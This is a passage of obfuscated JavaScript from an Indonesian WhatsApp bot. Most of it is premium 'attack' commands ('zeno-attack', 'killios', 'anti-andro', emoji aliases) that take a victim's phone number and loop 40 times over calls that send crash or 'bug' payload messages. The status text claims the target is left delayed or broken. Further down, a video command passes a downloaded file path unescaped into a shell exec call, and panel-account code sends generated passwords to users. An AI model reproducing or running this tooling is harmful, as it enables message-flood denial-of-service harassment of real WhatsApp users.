        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "zeno-attack":
      case "zeno-1jam":
      case "zeno-war":
      case "zeno1":
      case "zeno4":
      case "virtex":
      case "zeno2":
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x39dfe7 = 0x0; _0x39dfe7 < 0x28; _0x39dfe7++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "iphone":
      case "xiphone":
      case "zeno-kill":
      case "zeno5":
      case 'killios':
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x1b10c9 = 0x0; _0x1b10c9 < 0x28; _0x1b10c9++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "anti-andro1":
      case "anti-andro2":
      case "zeno-war":
      case '😡':
      case 'zeno3':
      case "anti-andro3":
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x3e21e0 = 0x0; _0x3e21e0 < 0x28; _0x3e21e0++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case '🗿':
      case '🔪':
      case '🤙':
      case '👊':
      case '🤡':
      case '😍':
      case '🌹':
      case '🐷':
      case '😜':
      case '😑':
      case '🤣':
      case '👍':
      case '🤫':
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0xd043d4 = 0x0; _0xd043d4 < 0x28; _0xd043d4++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "antigedor":
      case "sodok-zeno":
      case "vip-bug":
      case "zeno-bantai":
      case "wardek":
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x5dfe5f = 0x0; _0x5dfe5f < 0x28; _0x5dfe5f++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case 'ball1':
      case 'ball2':
      case "ball3":
      case "ball4":
      case "ball5":
      case 'ball6':
      case 'ball7':
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x12b963 = 0x0; _0x12b963 < 0x28; _0x12b963++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case 'goku':
      case "vegeta":
      case "gohan":
      case "picolo":
      case "buu":
      case "frieza":
      case 'krilin':
      case "trunks":
      case "goten":
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x495485 = 0x0; _0x495485 < 0x28; _0x495485++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case 'owner':
        {
          if (!_0x37e4b2) {
            return _0xd6f2c2("Mau Ngapain Dek ??");
          }
          const _0x52dac6 = await _0x1e35db.sendMessage(_0x391d98, {
            'contacts': {
              'displayName': _0x1ac537.length + " Kontak",
              'contacts': _0x1ac537
            },
            'contextInfo': {
              'forwardingScore': 0x98967f,
              'isForwarded': true,
              'mentionedJid': [_0x3d7422]
            }
          }, {
            'quoted': _0xe0b9f4
          });
          _0x1e35db.sendMessage(_0x391d98, {
            'text': "Nih Owner Gw Jangan Macem\"",
            'contextInfo': {
              'forwardingScore': 0x98967f,
              'isForwarded': true,
              'mentionedJid': [_0x3d7422]
            }
          }, {
            'quoted': _0x52dac6
          });
        }
        break;
      case "addowner":
        if (!_0xd5b998) {
          return _0xd6f2c2(mess.only.owner);
        }
        if (!_0x34b560[0x0]) {
          return _0xd6f2c2("Penggunaan " + (_0x270d27 + _0x539f0c) + " nomor\nContoh " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        bnnd = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x2c07ea = await _0x1e35db.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x2c07ea.length == 0x0) {
          return _0xd6f2c2("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
        }
        _0x34406b.push(bnnd);
        fs.writeFileSync("./database/owner.json", JSON.stringify(_0x34406b));
        _0xd6f2c2("Nomor " + bnnd + " Telah Menjadi Owner!!!");
        break;
      case 'delowner':
        if (!_0xd5b998) {
          return _0xd6f2c2(mess.only.owner);
        }
        if (!_0x34b560[0x0]) {
          return _0xd6f2c2("Penggunaan " + (_0x270d27 + _0x539f0c) + " nomor\nContoh " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        ya = q.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = _0x34406b.indexOf(ya);
        _0x34406b.splice(unp, 0x1);
        fs.writeFileSync("./database/owner.json", JSON.stringify(_0x34406b));
        _0xd6f2c2("Nomor " + ya + " Telah Di Hapus Owner!!!");
        break;
      case "setowner":
        {
          if (!_0xd5b998) {
            return _0xd6f2c2("kusus owner");
          }
          if (!_0x2741d2) {
            return _0xd6f2c2("Contoh : " + (_0x270d27 + _0x539f0c) + " 62×××");
          }
          global.owner = _0x2741d2.split('|')[0x0];
          _0xd6f2c2("Exif berhasil diubah menjadi\n\n• No Owner : " + global.owner);
        }
        break;
      case 'self':
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          _0x1e35db["public"] = false;
          _0xd6f2c2("Succes Mode Private");
        }
        break;
      case "addmurbug":
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          if (!_0x34b560[0x0]) {
            return _0xd6f2c2("Penggunaan " + (_0x270d27 + _0x539f0c) + " nomor\nContoh " + (_0x270d27 + _0x539f0c) + " 62×××");
          }
          prrkek = q.split('|')[0x0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          let _0x2b64e4 = await _0x1e35db.onWhatsApp(prrkek);
          if (_0x2b64e4.length == 0x0) {
            return _0xd6f2c2("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
          }
          _0x4d5140.push(prrkek);
          fs.writeFileSync('./database/murbug.json', JSON.stringify(_0x4d5140));
          _0xd6f2c2("Nomor " + prrkek + " Telah Menjadi Murbug!");
        }
        break;
      case "delmurbug":
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          if (!_0x34b560[0x0]) {
            return _0xd6f2c2("Penggunaan " + (_0x270d27 + _0x539f0c) + " nomor\nContoh " + (_0x270d27 + _0x539f0c) + " 62×××");
          }
          ya = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          unp = _0x4d5140.indexOf(ya);
          _0x4d5140.splice(unp, 0x1);
          fs.writeFileSync("./database/murbug.json", JSON.stringify(_0x4d5140));
          _0xd6f2c2("Nomor " + ya + " Telah Di Hapus Murbug!");
        }
        break;
      case "public":
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          _0x1e35db["public"] = true;
          _0xd6f2c2("Succes Mode Public");
        }
        break;
      case 'qc':
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          if (!_0x254ceb) {} else {
            if (q) {} else {
              _0xd6f2c2("Kirim perintah " + (_0x270d27 + _0x539f0c) + " Dray Ganteng");
            }
          }
        }
        break;
      case "kontol":
        {
          _0xd6f2c2("Apa Kontol");
        }
        break;
      case 'ai':
        {
          if (!_0x2741d2) {
            return _0xd6f2c2("*• Example:* " + (_0x270d27 + _0x539f0c) + " Siapakah orang yang telah menemukan Komputer di jaman Majapahit");
          }
          await _0x1e35db.sendMessage(_0xe0b9f4.chat, {
            'react': {
              'text': '⏱️',
              'key': _0xe0b9f4.key
            }
          });
          try {
            let _0xa2933e = await (await fetch("https://widipe.com/openai?text=" + _0x2741d2)).json();
            let _0x1856ac = generateWAMessageFromContent(_0xe0b9f4.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': "> Zeno - AI\n\n" + _0xa2933e.result
                    }),
                    'footer': proto.Message.InteractiveMessage.Footer.create({
                      'text': namabot
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                      'hasMediaAttachment': false,
                      ...(await prepareWAMessageMedia({
                        'image': fs.readFileSync("./database/image/Xynz.jpg")
                      }, {
                        'upload': _0x1e35db.waUploadToServer
                      }))
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': [{
                        'name': "quick_reply",
                        'buttonParamsJson': "{\"display_text\":\"Nice Zeno - AI\",\"id\":\".mangap\"}"
                      }]
                    }),
                    'contextInfo': {
                      'mentionedJid': [_0xe0b9f4.sender],
                      'forwardingScore': 0x3e7,
                      'isForwarded': true,
                      'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "0@newsletter",
                        'newsletterName': namabot,
                        'serverMessageId': 0x8f
                      }
                    }
                  })
                }
              }
            }, {
              'quoted': _0xe0b9f4
            });
            await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x1856ac.message, {});
          } catch (_0x5c63c8) {
            return _0xd6f2c2("Error Kak :(");
          }
        }
        bbrea;
      case "hdvid":
      case 'hdvideo':
      case "vidiohd":
      case "tohd":
      case "vidhd":
        {
          const {
            exec: _0x17ad79
          } = require('child_process');
          const _0x2bc5ad = _0xe0b9f4.quoted ? _0xe0b9f4.quoted : _0xe0b9f4;
          const _0x213525 = (_0x2bc5ad.msg || _0x2bc5ad).mimetype || '';
          if (!_0x213525) {
            return _0xe0b9f4.reply("Mana vidio nya bang?");
          }
          _0xd6f2c2(mess.wait);
          const _0x5382c6 = await _0x1e35db.downloadAndSaveMediaMessage(_0x2bc5ad);
          _0x17ad79("ffmpeg -i " + _0x5382c6 + " -s 1280x720 -c:v libx264 -c:a copy " + 'output.mp4', (_0x416a91, _0x5854cf, _0x2ec205) => {
            if (_0x416a91) {
              console.error("Error: " + _0x416a91.message);
              return;
            }
            console.log("stdout: " + _0x5854cf);
            console.error("stderr: " + _0x2ec205);
            _0x1e35db.sendMessage(_0xe0b9f4.chat, {
              'caption': "_Success To HD Video_",
              'video': {
                'url': 'output.mp4'
              }
            }, {
              'quoted': _0xe0b9f4
            });
          });
          await sleep(0xea60);
          fs.unlinkSync('output.mp4');
          fs.unlinkSync(_0x5382c6);
        }
        break;
      case "enc":
      case "encrypt":
      case "obfuscate":
        {
          if (!q) {
            return _0xd6f2c2("Contoh " + (_0x270d27 + _0x539f0c) + " const time = require('money')");
          }
          let _0x1ab2e9 = await _0x390bc5(q);
          _0xd6f2c2('' + _0x1ab2e9.result);
        }
        break;
      case '1gb':
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x3b0bf3 = _0x2741d2.split(',');
          if (_0x3b0bf3.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x1de818 = _0x3b0bf3[0x0];
          let _0x44c057 = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x3b0bf3[0x1] ? _0x3b0bf3[0x1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : _0xe0b9f4.mentionedJid[0x0];
          let _0x52e2d7 = global.eggsnya;
          let _0xcc1c46 = global.location;
          let _0x379fcd = _0x1de818 + '@Dray.id';
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x44c057) {
            return;
          }
          let _0x3e0824 = _0x1de818 + "001";
          let _0x204256 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x379fcd,
              'username': _0x1de818,
              'first_name': _0x1de818,
              'last_name': _0x1de818,
              'language': 'en',
              'password': _0x3e0824
            })
          });
          let _0xf40635 = await _0x204256.json();
          if (_0xf40635.errors) {
            return _0xd6f2c2(JSON.stringify(_0xf40635.errors[0x0], null, 0x2));
          }
          let _0x3e970e = _0xf40635.attributes;
          let _0x47d31a = await fetch(domain + '/api/application/nests/5/eggs/' + _0x52e2d7, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x3e970e.id);
          let _0x44ea32 = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x3e970e.username + "\n🔐 Password: " + _0x3e0824 + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0x44c057, {
            'image': {
              'url': "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            'caption': _0x44ea32
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x20076f = await _0x47d31a.json();
          let _0x3d6953 = _0x20076f.attributes.startup;
          let _0x544ba6 = await fetch(domain + '/api/application/servers', {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x1de818 + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x3e970e.id,
              'egg': parseInt(_0x52e2d7),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x3d6953,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "1024",
                'swap': 0x0,
                'disk': "1024",
                'io': 0x1f4,
                'cpu': '50'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0xcc1c46)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4e0f4e = await _0x544ba6.json();
          if (_0x4e0f4e.errors) {
            return _0x1e35db(JSON.stringify(_0x4e0f4e.errors[0x0], null, 0x2));
          }
        }
        break;
      case '2gb':
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x27f597 = _0x2741d2.split(',');
          if (_0x27f597.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x39691d = _0x27f597[0x0];
          let _0xbdaec7 = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x27f597[0x1] ? _0x27f597[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0xe0b9f4.mentionedJid[0x0];
          let _0x446af1 = global.eggsnya;
          let _0x20d5c5 = global.location;
          let _0x31437f = _0x39691d + "@Dray.id";
          akunlo = 'https://g.top4top.io/p_3194iz70l0.jpg';
          if (!_0xbdaec7) {
            return;
          }
          let _0x500ce2 = _0x39691d + '001';
          let _0x4ed7ba = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x31437f,
              'username': _0x39691d,
